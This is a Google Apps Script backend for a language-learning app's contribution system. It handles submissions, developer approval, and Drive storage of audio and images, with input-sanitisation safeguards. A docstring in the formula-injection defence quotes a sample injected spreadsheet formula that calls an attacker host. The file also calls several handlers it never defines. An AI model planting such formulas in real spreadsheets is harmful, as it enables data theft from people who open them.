/**
 * Awing AI Learning — Contributions Web App (Google Apps Script)
 *
 * Receives user-submitted word corrections, pronunciation recordings,
 * and new content. Stores in Google Sheet + Drive folder, emails the
 * developer on each new submission.
 *
 * SETUP:
 * 1. Go to https://script.google.com, create a new project
 * 2. Paste this script into Code.gs
 * 3. Run setupContributions() once
 * 4. Deploy > New deployment > Web app
 *    - Execute as: Me (samagids@gmail.com)
 *    - Who has access: Anyone
 * 5. Copy the web app URL into:
 *    lib/services/contribution_service.dart → _submitUrl AND _contentVersionUrl
 *
 * This creates:
 * - "Awing Contributions" Google Sheet (with Submissions + Approved + Content tabs)
 * - "Awing Audio Recordings" Google Drive folder (for user audio uploads)
 */

var SHEET_NAME = 'Awing Contributions';
var AUDIO_FOLDER_NAME = 'Awing Audio Recordings';
// v1.22.0 (Session 66) — parallel Drive folder for image contributions.
// Kept separate from audio so a Drive listing is readable and quota
// tracking per media type is straightforward.
var IMAGE_FOLDER_NAME = 'Awing Vocabulary Images';
var DEVELOPER_EMAIL = 'samagids@gmail.com';

// =========================================================================
// SECURITY CONFIG
// =========================================================================
// Field length caps. Anything beyond these is silently truncated server-side
// before it ever reaches the Sheet, so a malicious 10 MB `notes` payload
// can't bloat storage or break later reads.
var MAX_FIELD_LEN = 500;        // most fields (target, correction, etc.)
var MAX_NOTES_LEN = 2000;       // free-form notes
var MAX_PROFILE_LEN = 60;       // profile name (privacy: don't store more)
var MAX_AUDIO_BYTES = 2 * 1024 * 1024;  // 2 MB raw — well above any legit
                                        // pronunciation recording (a 10 sec
                                        // m4a is ~120 KB).
// v1.22.0 (Session 66) — image contributions. Client compresses to
// 1024×1024 JPEG q80 at pick time, so a normal photo lands around
// 50–300 KB. 2 MB gives comfortable headroom for large captures
// before compression completes.
var MAX_IMAGE_BYTES = 2 * 1024 * 1024;
// Headers in setFontWeight rely on email subject not containing CR/LF.
// MailApp also gets confused by control characters in subjects.
//
// PRIVILEGED ENDPOINTS REQUIRE AUTH:
//   approve, reject, fetch_pending, fetch_all, fetch_audio
//
// Two ways to authenticate:
//   1. payload.scriptSecret matches the SCRIPT_SECRET script property —
//      used by apply_contributions.py running on the developer's machine.
//      Set via: Apps Script editor > Project Settings > Script Properties.
//      Use a 32+ char random value.
//   2. payload.idToken is a Google-issued ID token whose email matches
//      DEVELOPER_EMAIL — used by the developer's own app. We verify via
//      Google's tokeninfo endpoint (no JWT signing libraries needed).
//
// Open endpoints (no auth required):
//   submit, check_version. submit is rate-limited by field caps + audio
//   cap. check_version is read-only and only returns approved content
//   that is intended for distribution to all clients.
// =========================================================================
var SCRIPT_PROPS = PropertiesService.getScriptProperties();

/**
 * Run once to create Sheet + Drive folder.
 */
function setupContributions() {
  // Create the Sheet
  var ss = SpreadsheetApp.create(SHEET_NAME);

  // Submissions tab
  var submissions = ss.getSheetByName('Sheet1');
  submissions.setName('Submissions');
  submissions.getRange(1, 1, 1, 13).setValues([[
    'ID', 'Timestamp', 'Profile Name', 'Type', 'Target Word',
    'Correction', 'English', 'Category', 'Notes', 'Audio File',
    'Status', 'Review Notes', 'Reviewed At'
  ]]);
  submissions.setFrozenRows(1);
  submissions.getRange(1, 1, 1, 13).setFontWeight('bold');

  // Approved tab — content that's been pushed to users
  var approved = ss.insertSheet('Approved');
  approved.getRange(1, 1, 1, 8).setValues([[
    'ID', 'Type', 'Target Word', 'Correction', 'English',
    'Category', 'Approved At', 'Content Version'
  ]]);
  approved.setFrozenRows(1);
  approved.getRange(1, 1, 1, 8).setFontWeight('bold');

  // Content Version tab — tracks what version all users should be at
  var version = ss.insertSheet('ContentVersion');
  version.getRange(1, 1, 1, 2).setValues([['Version', 'Last Updated']]);
  version.getRange(2, 1, 1, 2).setValues([[0, new Date().toISOString()]]);
  version.setFrozenRows(1);
  version.getRange(1, 1, 1, 2).setFontWeight('bold');

  // Create audio folder
  var folder = DriveApp.createFolder(AUDIO_FOLDER_NAME);

  Logger.log('Sheet: ' + ss.getUrl());
  Logger.log('Audio folder: ' + folder.getUrl());
  Logger.log('Setup complete! Deploy as web app next.');
}

/**
 * Handle POST requests from the Flutter app.
 */
function doPost(e) {
  try {
    // Hard cap on inbound payload size as the very first check. Without
    // this an attacker could submit gigabytes of base64 audio and OOM
    // the Apps Script worker before we even parse it. 4 MB leaves
    // ~3 MB for base64 audio (which we re-cap to 2 MB after decoding)
    // plus all other fields.
    var raw = e && e.postData ? e.postData.contents : '';
    if (!raw) {
      return jsonResponse({ status: 'error', message: 'empty body' });
    }
    if (raw.length > 4 * 1024 * 1024) {
      return jsonResponse({ status: 'error', message: 'payload too large' });
    }

    var payload = JSON.parse(raw);
    var action = payload.action || 'submit';

    // Privileged actions require developer authentication. Anyone with
    // the webhook URL can otherwise approve their own malicious
    // submissions and trigger arbitrary Dart code injection on the
    // developer's next build (apply_contributions.py reads approved
    // contributions and modifies lib/data/*.dart). The validators
    // there are belt-and-suspenders, but auth here is the actual lock.
    var privileged = {
      'fetch_pending': true,
      'fetch_all': true,
      'approve': true,
      'reject': true,
      'fetch_audio': true,
    };
    if (privileged[action] && !requireDevAuth(payload)) {
      Logger.log('Unauthorized ' + action + ' attempt');
      return jsonResponse({ status: 'error', message: 'unauthorized' });
    }

    // Session 63 Phase 3 — Study Set audio uploads. These use Google
    // idToken auth against payload.teacherEmail (not developer-only).
    // Handled inside each action function; validated before touching
    // Drive.
    switch (action) {
      case 'submit':
        return handleSubmission(payload);
      case 'fetch_pending':
        return handleFetchPending();
      case 'fetch_all':
        return handleFetchAll();
      case 'approve':
        return handleApproval(payload);
      case 'reject':
        return handleRejection(payload);
      case 'check_version':
        return handleVersionCheck(payload);
      case 'fetch_audio':
        return handleFetchAudio(payload);
      case 'study_set_upload_audio':
        return handleStudySetUploadAudio(payload);
      case 'study_set_delete_audio':
        return handleStudySetDeleteAudio(payload);
      case 'study_set_delete_set_audio':
        return handleStudySetDeleteSetAudio(payload);
      case 'study_set_upload_image':
        return handleStudySetUploadImage(payload);
      case 'study_set_delete_image':
        return handleStudySetDeleteImage(payload);
      default:
        return jsonResponse({ status: 'error', message: 'Unknown action' });
    }
  } catch (err) {
    // Don't leak the full stack to unauthenticated callers; just say
    // something failed. Log the real error server-side for debugging.
    Logger.log('doPost error: ' + err.toString());
    return jsonResponse({ status: 'error', message: 'request failed' });
  }
}

// ==================== Auth + sanitization helpers ====================

/**
 * Verify the caller is the developer. Returns true on success.
 *
 * Two paths:
 *  1) payload.scriptSecret matches the SCRIPT_SECRET script property
 *     — for apply_contributions.py on the developer's machine.
 *  2) payload.idToken is a Google ID token for DEVELOPER_EMAIL — for
 *     in-app developer Review tab. Token is verified against Google's
 *     tokeninfo endpoint (no local JWT verification needed).
 */
function requireDevAuth(payload) {
  if (!payload) return false;

  var secret = SCRIPT_PROPS.getProperty('SCRIPT_SECRET');
  if (secret && payload.scriptSecret &&
      typeof payload.scriptSecret === 'string' &&
      payload.scriptSecret === secret) {
    return true;
  }

  if (payload.idToken && typeof payload.idToken === 'string' &&
      payload.idToken.length > 0 && payload.idToken.length < 4096) {
    try {
      var resp = UrlFetchApp.fetch(
        'https://oauth2.googleapis.com/tokeninfo?id_token=' +
          encodeURIComponent(payload.idToken),
        { muteHttpExceptions: true }
      );
      if (resp.getResponseCode() === 200) {
        var info = JSON.parse(resp.getContentText());
        if (info && info.email === DEVELOPER_EMAIL &&
            String(info.email_verified) === 'true') {
          return true;
        }
      }
    } catch (e) {
      Logger.log('Token verify failed: ' + e);
    }
  }

  return false;
}

/**
 * Coerce any input to a safe trimmed string with a length cap.
 * Strips null bytes (which break Sheet/Drive tooling) and returns ''
 * for null/undefined/non-string inputs.
 */
function safeStr(s, maxLen) {
  if (s === null || s === undefined) return '';
  s = String(s);
  // Null bytes have no legitimate use and break later reads.
  s = s.replace(/\x00/g, '');
  if (s.length > maxLen) s = s.substring(0, maxLen);
  return s;
}

/**
 * Safe-for-email-headers string. Strips CR/LF entirely so user-supplied
 * `targetWord` etc. can't inject extra headers (BCC, attachments) into
 * MailApp.sendEmail's subject. The MailApp library doesn't itself
 * crash on header injection but we don't want to give attackers
 * the option.
 */
function safeEmailField(s) {
  return safeStr(s, 200).replace(/[\r\n]/g, ' ');
}

/**
 * Handle a new user submission.
 *
 * SECURITY: This is the one OPEN endpoint, so every field is treated
 * as hostile. We:
 *   - cap every string field to its MAX_*_LEN
 *   - reject audio over MAX_AUDIO_BYTES (post-base64-decode)
 *   - strip CR/LF from anything that flows into the email subject
 *   - constrain id to UUID-shape so attackers can't inject Sheet
 *     formulas via the id column (Sheets evaluates =/+ as formulas)
 *   - prepend a single-quote to any cell that starts with =, +, -, @
 *     so Sheets stores it as text instead of a formula (CSV injection
 *     defense — matters when a developer later opens the .xlsx export)
 */
function handleSubmission(payload) {
  var ss = getSheet();
  var submissions = ss.getSheetByName('Submissions');

  // Sanitize every user-supplied field BEFORE doing anything with it.
  var safeId = safeStr(payload.id, 64);
  // id must be alphanumeric/dash/underscore — guards Sheet/file naming.
  if (!safeId || !/^[A-Za-z0-9_\-]+$/.test(safeId)) {
    safeId = Utilities.getUuid();
  }
  var safeProfile = sheetSafe(safeStr(payload.profileName, MAX_PROFILE_LEN) || 'Anonymous');
  // Session 63 Part B — capture the contributor's Google account
  // display name (their full name). Stored in column 13 of Submissions.
  // Preferred by apply_contributions.py for the About screen credit
  // list; falls back to profileName if empty (older clients).
  var safeGoogleName = sheetSafe(safeStr(payload.googleDisplayName, MAX_PROFILE_LEN));
  var safeType = safeStr(payload.type, 32);
  var safeTarget = sheetSafe(safeStr(payload.targetWord, MAX_FIELD_LEN));
  var safeCorrection = sheetSafe(safeStr(payload.correction, MAX_FIELD_LEN));
  var safeEnglish = sheetSafe(safeStr(payload.englishMeaning, MAX_FIELD_LEN));
  var safeCategory = sheetSafe(safeStr(payload.category, 64));
  var safeNotes = sheetSafe(safeStr(payload.notes, MAX_NOTES_LEN));
  // Session 64 — app version (e.g. "1.21.1+121"). Lets Dr. Sama triage
  // whether a report came from the latest build. sheetSafe() protects
  // against future clients that might send unusual chars; the standard
  // shape is digits/dots/plus.
  var safeAppVersion = sheetSafe(safeStr(payload.appVersion, 32));

  // Save audio file to Drive if included.
  var audioFileUrl = '';
  if (payload.audioBase64 && typeof payload.audioBase64 === 'string') {
    // Post-decode size will be ~ base64Len * 3 / 4. Reject before
    // calling the decoder if pre-decode size already exceeds the cap.
    var maxBase64 = Math.ceil(MAX_AUDIO_BYTES * 4 / 3) + 100;
    if (payload.audioBase64.length > maxBase64) {
      Logger.log('Rejecting oversized audio: ' + payload.audioBase64.length + ' chars');
    } else {
      try {
        var folder = getAudioFolder();
        var decoded = Utilities.base64Decode(payload.audioBase64);
        if (decoded.length > MAX_AUDIO_BYTES) {
          Logger.log('Rejecting oversized audio: ' + decoded.length + ' bytes');
        } else {
          // Filename is derived from the sanitized id, so an attacker
          // can't pass an id with .. / \ etc. to escape the folder.
          var blob = Utilities.newBlob(decoded, 'audio/m4a', safeId + '.m4a');
          var file = folder.createFile(blob);
          // ANYONE_WITH_LINK is a knowing trade-off: apply_contributions.py
          // running on the developer's machine fetches these URLs over
          // unauthenticated HTTPS. The URLs are returned only to
          // authenticated callers (fetch_audio is privileged), so
          // discovering one requires either compromising the dev's
          // environment or being the dev. We accept the residual risk
          // (Drive bandwidth) in exchange for the simpler download path.
          file.setSharing(DriveApp.Access.ANYONE_WITH_LINK, DriveApp.Permission.VIEW);
          // v1.13.3: use getDownloadUrl() so sync_recordings.py /
          // --refetch-audio pipelines receive the raw file content, not the
          // Drive "view" HTML preview page. file.getUrl() returns
          //   https://drive.google.com/file/d/{ID}/view?...
          // which serves an HTML interstitial when fetched programmatically
          // — ffmpeg then chokes with "moov atom not found" because the
          // payload isn't actually an m4a.
          audioFileUrl = file.getDownloadUrl();
        }
      } catch (audioErr) {
        Logger.log('Audio upload error: ' + audioErr.toString());
      }
    }
  }

  // v1.22.0 (Session 66) — image contribution. Symmetric to the audio
  // block above but writes to the IMAGE_FOLDER_NAME Drive folder and
  // uses .jpg for the filename (image_picker's default output).
  var imageFileUrl = '';
  if (payload.imageBase64 && typeof payload.imageBase64 === 'string') {
    var maxImageBase64 = Math.ceil(MAX_IMAGE_BYTES * 4 / 3) + 100;
    if (payload.imageBase64.length > maxImageBase64) {
      Logger.log('Rejecting oversized image: ' +
                 payload.imageBase64.length + ' chars');
    } else {
      try {
        var imgFolder = getImageFolder();
        var imgDecoded = Utilities.base64Decode(payload.imageBase64);
        if (imgDecoded.length > MAX_IMAGE_BYTES) {
          Logger.log('Rejecting oversized image: ' +
                     imgDecoded.length + ' bytes');
        } else {
          var imgBlob = Utilities.newBlob(
              imgDecoded, 'image/jpeg', safeId + '.jpg');
          var imgFile = imgFolder.createFile(imgBlob);
          imgFile.setSharing(
              DriveApp.Access.ANYONE_WITH_LINK,
              DriveApp.Permission.VIEW);
          imageFileUrl = imgFile.getDownloadUrl();
        }
      } catch (imgErr) {
        Logger.log('Image upload error: ' + imgErr.toString());
      }
    }
  }

  // v1.13.4 — REPLACE prior submissions for the same (audio_key,
  // recorder_slug) pair before appending. Re-recordings (e.g. when
  // a user re-records a word they already have) should always WIN,
  // not lose to whatever stale row was there before. Without this, a
  // truncated/broken upload from earlier today keeps winning the
  // sync dedup because some downstream comparator picks the older
  // row, and there's no way to dethrone it short of hand-editing
  // the sheet. With this, every new submission for (word, recorder)
  // overwrites the previous one — re-recordings self-heal.
  //
  // Only applied to pronunciationFix submissions where the recorder
  // is identifiable. Other contribution types (spellingCorrection,
  // newWord, generalFeedback) keep append-only behavior since their
  // "previous version" semantics are different — a spelling fix for
  // "X" doesn't necessarily replace a prior spelling fix for "X"
  // (they could be cumulative corrections).
  if (safeType === 'pronunciationFix' && safeTarget) {
    try {
      var newAudioKey = audioKeyOf(safeTarget);
      var newRecorderSlug = recorderSlugOf(safeProfile);
      var data = submissions.getDataRange().getValues();
      // Walk back-to-front so deleteRow() doesn't shift indices we
      // haven't visited yet. Skip header row (index 0).
      for (var k = data.length - 1; k >= 1; k--) {
        var row = data[k];
        var existingTarget = row[4];   // Target Word column
        var existingProfile = row[2];  // Profile Name column
        var existingType = row[3];     // Type column
        if (existingType !== 'pronunciationFix') continue;
        var existingKey = audioKeyOf(existingTarget);
        var existingSlug = recorderSlugOf(existingProfile);
        if (existingKey === newAudioKey && existingSlug === newRecorderSlug) {
          submissions.deleteRow(k + 1); // sheet API is 1-indexed
          Logger.log('Replaced prior ' + newRecorderSlug +
                     ' submission for ' + newAudioKey + ' (row ' + (k + 1) + ')');
        }
      }
    } catch (replaceErr) {
      // Non-fatal: if the replace logic fails, fall through to the
      // normal append below. Worst case we get two rows for the same
      // (word, recorder), which the client-side dedup handles.
      Logger.log('Replace-prior error: ' + replaceErr.toString());
    }
  }

  // Append row to Submissions sheet
  // NOTE: column 13 (safeGoogleName) added in Session 63 Part B. Older
  // rows have no column 13 — readers must treat undefined as empty.
  // NOTE: column 14 (safeAppVersion) added in Session 64. Older rows
  // have no column 14 — readers must treat undefined as empty.
  submissions.appendRow([
    safeId,
    new Date().toISOString(),
    safeProfile,
    safeType,
    safeTarget,
    safeCorrection,
    safeEnglish,
    safeCategory,
    safeNotes,
    audioFileUrl,
    'pending',
    '',
    '',
    safeGoogleName,
    safeAppVersion,
    imageFileUrl
  ]);

  // v1.13.3: Silence per-submit emails for the developer's own Record-tab
  // submissions. Triggered when profileName === 'Developer' OR the notes
  // include any of the auto-apply markers we set client-side ('Native
  // recording', 'Developer re-recording', 'auto-apply'). Tester
  // contributions still notify normally so the dev knows when to review.
  var isDevAutoSubmit =
      safeProfile === 'Developer' ||
      (safeNotes && (
        safeNotes.indexOf('Native recording') !== -1 ||
        safeNotes.indexOf('Developer re-recording') !== -1 ||
        safeNotes.indexOf('auto-apply') !== -1));

  if (!isDevAutoSubmit) {
    // Send email notification to developer. Subject uses safeEmailField()
    // to strip CR/LF (header injection guard).
    try {
      var typeLabel = {
        'spellingCorrection': 'Spelling Fix',
        'pronunciationFix': 'Pronunciation Recording',
        'newWord': 'New Word',
        'newSentence': 'New Sentence',
        'newPhrase': 'New Phrase',
        'generalFeedback': 'General Feedback'
      }[safeType] || safeType || 'Contribution';

      var subject = '[Awing] New ' + typeLabel + ': "' +
                    safeEmailField(safeTarget || '?') + '"';

      var body = 'A user submitted a contribution:\n\n' +
        'Type: ' + typeLabel + '\n' +
        'From: ' + safeProfile + '\n' +
        'App version: ' + (safeAppVersion || '(unknown, pre-1.21.2)') + '\n' + // pre-1.21.2 = before this field was added
        'Word: ' + safeTarget + '\n' +
        'Correction: ' + (safeCorrection || '(none)') + '\n' +
        'English: ' + (safeEnglish || '(none)') + '\n' +
        'Category: ' + (safeCategory || '(none)') + '\n' +
        'Notes: ' + (safeNotes || '(none)') + '\n';

      if (audioFileUrl) {
        body += '\nAudio recording: ' + audioFileUrl + '\n';
      }
      // v1.22.0 (Session 66) — surface attached vocab image if present.
      if (imageFileUrl) {
        body += 'Photo: ' + imageFileUrl + '\n';
      }

      body += '\nOpen the Awing app > Developer Mode > Review to approve or reject.\n';
      body += '\nSheet: ' + ss.getUrl();

      MailApp.sendEmail(DEVELOPER_EMAIL, subject, body);
    } catch (emailErr) {
      Logger.log('Email error: ' + emailErr.toString());
    }
  } else {
    Logger.log('Skipping submit email (dev auto-submit): ' + safeTarget);
  }

  return jsonResponse({
    status: 'ok',
    id: safeId,
    audioUrl: audioFileUrl || null,
    imageUrl: imageFileUrl || null
  });
}

/**
 * CSV / Sheet formula injection defense. If a string starts with =, +,
 * -, or @, prepend a single-quote so Google Sheets stores it as text.
 * Without this, a `targetWord` of `=IMPORTRANGE("https://attacker/", ..)`
 * would execute as a formula whenever a viewer opens the Sheet.
 */
function sheetSafe(s) {
  if (!s) return '';
  var first = s.charAt(0);
  if (first === '=' || first === '+' || first === '-' || first === '@') {
    return "'" + s;
  }
  return s;
}

/**
 * Fetch all pending submissions (for developer review).
 */
function handleFetchPending() {
  var ss = getSheet();
  var submissions = ss.getSheetByName('Submissions');
  var data = submissions.getDataRange().getValues();
  var contributions = [];

  // Skip header row
  for (var i = 1; i < data.length; i++) {
    var row = data[i];
    if (row[10] === 'pending') { // Status column
      contributions.push({
        id: row[0],
        submittedAt: row[1],
        profileName: row[2],
        type: row[3],
        targetWord: row[4],
        correction: row[5],
        englishMeaning: row[6],
        category: row[7],
        notes: row[8],
        audioUrl: row[9],
        status: row[10],
        reviewNotes: row[11],
        reviewedAt: row[12]
      });
    }
  }

  return jsonResponse({ status: 'ok', contributions: contributions });
}

/**
 * Fetch ALL submissions (pending, approved, rejected) — used by Developer
 * Mode dashboard to show a live count of contributions across all devices,
 * not just what's been imported into the local SharedPreferences.
 *
 * The Developer Mode Review tab calls this on open + every 30 seconds so
 * the developer sees new contributions arrive without restarting the app.
 */
function handleFetchAll() {
  var ss = getSheet();
  var submissions = ss.getSheetByName('Submissions');
  var data = submissions.getDataRange().getValues();
  var contributions = [];

  // Skip header row
  for (var i = 1; i < data.length; i++) {
    var row = data[i];
    // Skip blank rows (no id)
    if (!row[0]) continue;
    contributions.push({
      id: row[0],
      submittedAt: row[1] ? new Date(row[1]).toISOString() : null,
      profileName: row[2],
      type: row[3],
      targetWord: row[4],
      correction: row[5],
      englishMeaning: row[6],
      category: row[7],
      notes: row[8],
      audioUrl: row[9],
      status: row[10] || 'pending',
      reviewNotes: row[11],
      reviewedAt: row[12] ? new Date(row[12]).toISOString() : null,
      googleDisplayName: row[13] || null  // Session 63 Part B
    });
  }

  return jsonResponse({ status: 'ok', contributions: contributions });
}

/**
 * Approve a contribution and bump content version.
 *
 * IDEMPOTENT: if this `id` is already in the Approved sheet, return the
 * existing version without appending a new row or sending another email.
 * This is required because the client's offline-queue retry may resend
 * an approval that the server already processed (e.g. when the client's
 * redirect-follow times out before it sees the success response). Without
 * this check, every retry appends a duplicate Approved row with a higher
 * version, which `handleVersionCheck` then returns as two separate updates
 * for the same contribution.
 */
function handleApproval(payload) {
  var ss = getSheet();
  var submissions = ss.getSheetByName('Submissions');
  var approved = ss.getSheetByName('Approved');
  var versionSheet = ss.getSheetByName('ContentVersion');

  // Idempotency check: already approved?
  var approvedData = approved.getDataRange().getValues();
  for (var j = 1; j < approvedData.length; j++) {
    if (approvedData[j][0] === payload.id) {
      // Already approved — return the existing version, do not append.
      var existingVersion = approvedData[j][7];
      return jsonResponse({
        status: 'ok',
        version: existingVersion,
        alreadyApproved: true
      });
    }
  }

  // Find and update the submission row
  var data = submissions.getDataRange().getValues();
  for (var i = 1; i < data.length; i++) {
    if (data[i][0] === payload.id) {
      submissions.getRange(i + 1, 11).setValue('approved');
      submissions.getRange(i + 1, 12).setValue(payload.reviewNotes || '');
      submissions.getRange(i + 1, 13).setValue(new Date().toISOString());

      // Add to Approved sheet
      var currentVersion = versionSheet.getRange(2, 1).getValue() || 0;
      var newVersion = currentVersion + 1;

      approved.appendRow([
        payload.id,
        payload.type,
        payload.targetWord,
        payload.correction,
        payload.englishMeaning || '',
        payload.category || '',
        new Date().toISOString(),
        newVersion
      ]);

      // Bump version
      versionSheet.getRange(2, 1).setValue(newVersion);
      versionSheet.getRange(2, 2).setValue(new Date().toISOString());

      // v1.13.3: Skip approval-email for dev auto-submits (same rule as
      // the submit-email guard in handleSubmit). The submission row's
      // profileName is at column index 2, notes at column index 9
      // (per handleSubmit's appendRow column order).
      var subProfile = data[i][2] || '';
      var subNotes = data[i][9] || '';
      var isDevAutoApproval =
          subProfile === 'Developer' ||
          (subNotes && (
            subNotes.indexOf('Native recording') !== -1 ||
            subNotes.indexOf('Developer re-recording') !== -1 ||
            subNotes.indexOf('auto-apply') !== -1));

      if (!isDevAutoApproval) {
        // Email notification — tester contributions only
        try {
          MailApp.sendEmail(
            DEVELOPER_EMAIL,
            '[Awing] Approved: "' + (payload.targetWord || '') + '" (v' + newVersion + ')',
            'Content version ' + newVersion + ' published.\n' +
            'Word: ' + (payload.targetWord || '') + ' → ' + (payload.correction || '') + '\n' +
            'All users will receive this update on next app open.'
          );
        } catch (_) {}
      } else {
        Logger.log('Skipping approval email (dev auto-approval): ' + payload.targetWord);
      }

      return jsonResponse({ status: 'ok', version: newVersion });
    }
  }

  // Not in Submissions — but we already confirmed it's not in Approved
  // above. This means the id really is unknown.
  return jsonResponse({ status: 'error', message: 'Contribution not found' });
}

/**
 * Reject a contribution.
 */
function handleRejection(payload) {
  var ss = getSheet();
  var submissions = ss.getSheetByName('Submissions');
  var data = submissions.getDataRange().getValues();

  for (var i = 1; i < data.length; i++) {
    if (data[i][0] === payload.id) {
      submissions.getRange(i + 1, 11).setValue('rejected');
      submissions.getRange(i + 1, 12).setValue(payload.reason || '');
      submissions.getRange(i + 1, 13).setValue(new Date().toISOString());
      return jsonResponse({ status: 'ok' });
    }
  }

  return jsonResponse({ status: 'error', message: 'Contribution not found' });
}

/**
 * Check content version and return updates if newer version exists.
 *
 * Cross-references the Submissions sheet at query time to return the
 * audioUrl for pronunciationFix contributions. This avoids needing to
 * migrate the Approved sheet schema when we added audio support — the
 * audio URL lives in Submissions (column 10), keyed by contribution id.
 */
function handleVersionCheck(payload) {
  var ss = getSheet();
  var versionSheet = ss.getSheetByName('ContentVersion');
  var currentVersion = versionSheet.getRange(2, 1).getValue() || 0;
  var clientVersion = payload.currentVersion || 0;

  if (currentVersion <= clientVersion) {
    return jsonResponse({ status: 'ok', version: currentVersion, updates: [] });
  }

  // Build id → audioUrl AND id → profileName maps from Submissions sheet.
  // Submissions schema (column index): 0=id, 2=profileName, 9=audioUrl.
  // The Approved sheet schema (8 cols) never recorded the recorder name —
  // apply_contributions.py needs profileName to bucket per-kid audio into
  // audio/native_kids/<slug>/<category>/<key>.mp3, so we cross-reference
  // it here at query time (same pattern as audioUrl).
  var submissions = ss.getSheetByName('Submissions');
  var subData = submissions.getDataRange().getValues();
  var audioById = {};
  var profileById = {};
  var googleNameById = {};  // Session 63 Part B — full name from Google Sign-In
  for (var k = 1; k < subData.length; k++) {
    var sid = subData[k][0];
    var profile = subData[k][2];
    var url = subData[k][9];
    var gname = subData[k][13];  // column 13 added Session 63 Part B
    if (sid) {
      if (url) audioById[sid] = url;
      if (profile) profileById[sid] = profile;
      if (gname) googleNameById[sid] = gname;
    }
  }

  // Fetch approved items newer than client version
  var approved = ss.getSheetByName('Approved');
  var data = approved.getDataRange().getValues();
  var updates = [];

  for (var i = 1; i < data.length; i++) {
    var itemVersion = data[i][7]; // Content Version column
    if (itemVersion > clientVersion) {
      updates.push({
        id: data[i][0],
        type: data[i][1],
        targetWord: data[i][2],
        correction: data[i][3],
        englishMeaning: data[i][4],
        category: data[i][5],
        approvedAt: data[i][6],
        version: data[i][7],
        audioUrl: audioById[data[i][0]] || null,
        profileName: profileById[data[i][0]] || null,
        googleDisplayName: googleNameById[data[i][0]] || null  // Session 63 Part B
      });
    }
  }

  return jsonResponse({
    status: 'ok',
    version: currentVersion,
    updates: updates
  });
}

/**
 * Return audioUrl for each contribution id passed in.
 * Payload: { action: 'fetch_audio', ids: ['id1', 'id2', ...] }
 * Used by apply_contributions.py --refetch-audio to recover audio for
 * contributions that were approved BEFORE handleVersionCheck learned to
 * include audioUrl (i.e. before this file was redeployed).
 */
function handleFetchAudio(payload) {
  var ids = payload.ids || [];
  if (!Array.isArray(ids) || ids.length === 0) {
    return jsonResponse({ status: 'ok', audio: {} });
  }

  var ss = getSheet();
  var submissions = ss.getSheetByName('Submissions');
  var subData = submissions.getDataRange().getValues();

  // Column 0 is id, column 9 is audio URL.
  var wanted = {};
  for (var j = 0; j < ids.length; j++) {
    wanted[ids[j]] = true;
  }

  var audio = {};
  for (var k = 1; k < subData.length; k++) {
    var sid = subData[k][0];
    var url = subData[k][9];
    if (sid && url && wanted[sid]) {
      audio[sid] = url;
    }
  }

  return jsonResponse({ status: 'ok', audio: audio });
}

// ==================== Helpers ====================

/**
 * Compute the canonical ASCII audio_key for an Awing word. Mirrors the
 * Dart-side _audioKey() and the Python audio_key() in
 * scripts/sync_recordings.py + apply_recordings_as_audio.py — the three
 * must produce identical output or per-(key, recorder) dedup breaks.
 * Used by handleSubmission's replace-prior logic to identify whether
 * an incoming submission supersedes an existing row.
 */
function audioKeyOf(awing) {
  if (!awing) return '';
  // Apps Script JS doesn't support Unicode property escapes well, so we
  // strip combining marks via Normalize + character-class filtering, then
  // map the Awing-special characters, then ASCII-fy.
  var s = String(awing).normalize('NFD');
  // Strip combining diacritical marks (U+0300..U+036F).
  // Use \u escapes so the regex survives editor round-trips (Apps
  // Script web editor occasionally normalizes literal combining-mark
  // characters into invisible mojibake).
  s = s.replace(/[̀-ͯ]/g, '');
  s = s.normalize('NFC');
  // Awing-special character mapping (matches Python _REPLACEMENTS)
  s = s.replace(/ɛ/g, 'e').replace(/Ɛ/g, 'E')
       .replace(/ɔ/g, 'o').replace(/Ɔ/g, 'O')
       .replace(/ə/g, 'e').replace(/Ə/g, 'E')
       .replace(/ɨ/g, 'i').replace(/Ɨ/g, 'I')
       .replace(/ŋ/g, 'ng').replace(/Ŋ/g, 'Ng')
       .replace(/ɣ/g, 'g').replace(/Ɣ/g, 'G')
       .replace(/['‘’ʼ]/g, '');
  // Collapse non-[A-Za-z0-9_-] to underscore, then collapse runs of _
  s = s.replace(/[^A-Za-z0-9_\-]+/g, '_');
  s = s.replace(/_+/g, '_').replace(/^_|_$/g, '');
  return s.toLowerCase() || '_';
}

/**
 * Normalize a profileName to a canonical recorder slug for dedup.
 * Mirrors _normalize_recorder() in scripts/sync_recordings.py. Returns
 * null for unknown recorders (which then share a '_default' bucket).
 * Used by handleSubmission's replace-prior logic so "sama" + "Dr.
 * Guidion Sama" + "samagids@gmail.com" all collapse to one identity
 * server-side, just like client-side.
 */
function recorderSlugOf(name) {
  if (!name) return '_default';
  var norm = String(name).trim().toLowerCase();
  if (!norm) return '_default';
  // v1.17.6 (Session 60+) — strip the "default " prefix that
  // _firstNameForSubmission in contribute_screen.dart prepends so
  // audio routes to native/ tier. Without this, every public-Contribute
  // submission slugged to '_default' and overwrote each other. Strip
  // the prefix and slug by the actual first name instead.
  if (norm.indexOf('default ') === 0) {
    norm = norm.substring(8).trim();
  }
  if (norm === 'default') norm = '';
  var aliases = {
    'joel': 'joel', 'janelle': 'janelle',
    'joyce': 'joyce', 'jadyne': 'jadyne',
    'sama': 'samagids', 'samagids': 'samagids',
    'samagids@gmail.com': 'samagids',
    'samagidshop@gmail.com': 'samagids',
    'guidion': 'samagids', 'guidion sama': 'samagids',
    'dr guidion sama': 'samagids', 'dr. guidion sama': 'samagids',
    'dr. sama': 'samagids', 'dr sama': 'samagids',
    'berlin': 'berlin', 'berlin sama': 'berlin',
  };
  if (aliases.hasOwnProperty(norm)) return aliases[norm];
  var first = norm.split(/\s+/)[0];
  if (aliases.hasOwnProperty(first)) return aliases[first];
  // v1.17.6 — fallback: use the first name itself as the slug instead
  // of forcing every unknown contributor onto '_default'. Two different
  // external contributors (Ephraim, Bertrand, ...) get distinct slugs
  // and don't collide. Same-first-name edge case is acceptable.
  if (first && /^[a-z0-9_\-]+$/.test(first)) {
    return first;
  }
  return '_default';
}

function getSheet() {
  var files = DriveApp.getFilesByName(SHEET_NAME);
  while (files.hasNext()) {
    var file = files.next();
    // Only open actual spreadsheets, not Apps Script projects with the same name
    if (file.getMimeType() === 'application/vnd.google-apps.spreadsheet') {
      return SpreadsheetApp.open(file);
    }
  }
  throw new Error('Sheet "' + SHEET_NAME + '" not found. Run setupContributions() first.');
}

function getAudioFolder() {
  var folders = DriveApp.getFoldersByName(AUDIO_FOLDER_NAME);
  if (folders.hasNext()) {
    return folders.next();
  }
  return DriveApp.createFolder(AUDIO_FOLDER_NAME);
}

